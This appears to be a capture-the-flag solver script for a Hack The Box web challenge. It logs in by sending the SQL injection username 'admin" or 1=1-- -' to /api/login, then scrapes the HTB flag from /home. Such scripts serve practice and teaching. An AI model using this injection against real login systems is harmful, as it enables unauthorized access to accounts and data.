#!/usr/bin/python3
from pwn import log
import requests, re, sys

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <host:port>")
    sys.exit(1)

target = f"http://{sys.argv[1]}"

session = requests.Session()

json = {"username": "admin\" or 1=1-- -", "password": "admin"}
session.post(target + "/api/login", json=json)

request = session.get(target + "/home")

pattern = re.compile(r"HTB\{(.+?)\}")
flag = pattern.search(request.text).group(0)
log.success(f"Flag: {flag}")
